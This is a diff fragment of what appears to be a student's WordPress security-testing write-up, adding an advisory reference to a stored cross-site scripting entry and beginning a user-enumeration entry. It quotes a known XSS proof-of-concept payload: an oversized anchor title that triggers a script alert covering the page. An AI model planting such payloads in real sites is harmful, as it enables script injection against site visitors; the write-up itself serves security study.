@@ -16,8 +16,8 @@ Time spent: 12 hours spent in total
 ```
 (<a title='x onmouseovlert(unescape(/BEST%20HACKER/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>er=a)
 ```
-  - [ ] Affected source code:
-  
+  - [x] Affected source code:
+    - [Reference](https://klikki.fi/adv/wordpress2.html)
 2. Username Disclosure (User Enenumeration)
   - [x] Summary: 
     - Vulnerability types: user enumeration
